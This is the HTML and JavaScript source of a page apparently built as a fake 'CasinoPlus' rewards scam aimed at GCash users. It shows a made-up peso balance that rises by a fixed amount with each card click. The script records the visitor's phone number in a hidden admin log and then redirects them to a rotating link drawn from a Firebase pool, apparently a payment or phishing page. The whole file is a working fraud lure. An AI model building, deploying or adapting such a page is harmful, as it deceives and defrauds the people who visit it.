<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CasinoPlus | Rewards Terminal</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>
    <style>
        :root { --gold: #fbbf24; --bg: #060a13; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        
        .header { text-align: center; margin-bottom: 30px; }
        .reward-display { font-size: 32px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px rgba(251, 191, 36, 0.5); margin: 10px 0; }

        /* GRID SYSTEM */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 400px; width: 100%; }

        /* CARD ANIMATIONS & HOVER */
        .card { 
            aspect-ratio: 1/1; background: rgba(255,255,255,0.05); border: 1px solid rgba(251, 191, 36, 0.3);
            border-radius: 15px; display: flex; align-items: center; justify-content: center;
            cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            font-size: 24px; position: relative; overflow: hidden;
        }

        /* Highlight sa Cursor */
        .card:hover { transform: translateY(-5px) scale(1.05); background: rgba(251, 191, 36, 0.1); border-color: var(--gold); box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
        
        /* After Click Animation */
        .card.clicked { animation: reveal 0.6s forwards; pointer-events: none; }
        @keyframes reveal {
            0% { transform: rotateY(0deg); }
            50% { transform: rotateY(90deg); background: var(--gold); }
            100% { transform: rotateY(0deg); background: rgba(34, 197, 94, 0.2); border-color: #22c55e; }
        }

        .claim-section { margin-top: 30px; width: 100%; max-width: 400px; display: none; text-align: center; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .btn-claim { background: var(--gold); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="header">
        <p style="color: #94a3b8;">Current Payout Wallet</p>
        <div class="reward-display">₱<span id="currentBalance">0.00</span></div>
        <p id="statusMsg" style="font-size: 12px; color: #22c55e;">Select a card to boost your reward!</p>
    </div>

    <div class="grid" id="cardGrid">
        </div>

    <div class="claim-section" id="claimSection">
        <p style="margin-bottom: 15px; font-size: 14px;">Target Amount Reached! Secure your payout now.</p>
        <button class="btn-main btn-claim" onclick="redirectToVialink()">Claim Reward via GCash</button>
    </div>

<script>
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const userPhone = localStorage.getItem("userPhone") || "Guest";

    let balance = 0;
    let clickCount = 0;
    const maxClicks = 5;

    // 1. RANDOM STARTING OFFER (Matapos i-visit ang main.html)
    window.onload = () => {
        const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
        updateBalance(randomStart);
        generateCards();
    };

    function generateCards() {
        const grid = document.getElementById('cardGrid');
        for (let i = 0; i < 9; i++) {
            const card = document.createElement('div');
            card.className = 'card';
            card.innerHTML = '🎁';
            card.onclick = () => handleCardClick(card);
            grid.appendChild(card);
        }
    }

    function handleCardClick(cardElement) {
        if (clickCount >= maxClicks || cardElement.classList.contains('clicked')) return;

        clickCount++;
        cardElement.classList.add('clicked');
        
        // 2. ACCURATE +25 LOGIC
        const bonus = 25;
        updateBalance(bonus);
        cardElement.innerHTML = `<span style="color:#22c55e; font-weight:bold;">+${bonus}</span>`;

        if (clickCount === maxClicks) {
            document.getElementById('statusMsg').innerText = "LIMIT REACHED - PROCEED TO CLAIM";
            document.getElementById('claimSection').style.display = 'block';
            logUserActivity(); // Log sa Ghost Section
        }
    }

    function updateBalance(amount) {
        balance += amount;
        document.getElementById('currentBalance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
    }

    // 3. LOGGING FOR ADMIN GHOST SECTION
    function logUserActivity() {
        db.ref('user_logs/' + userPhone).set({
            phone: userPhone,
            reward: balance,
            status: 'idle', // Idle muna kasi di pa na-click yung claim button
            last_updated: new Date().toLocaleString()
        });
    }

    function redirectToVialink() {
        // Find available link and redirect
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
            if (snapshot.exists()) {
                const linkId = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[linkId];

                // Update link status to 'pending' para sa 10-min timer
                db.ref('links/' + linkId).update({
                    status: 'pending',
                    user: userPhone,
                    timestamp: Date.now()
                });

                // Update user to 'claimed' status
                db.ref('user_logs/' + userPhone).update({ status: 'claimed' });

                window.location.href = linkData.url;
            } else {
                alert("All payout lines are busy. Please try again in 10 minutes.");
            }
        });
    }
</script>
</body>
</html>
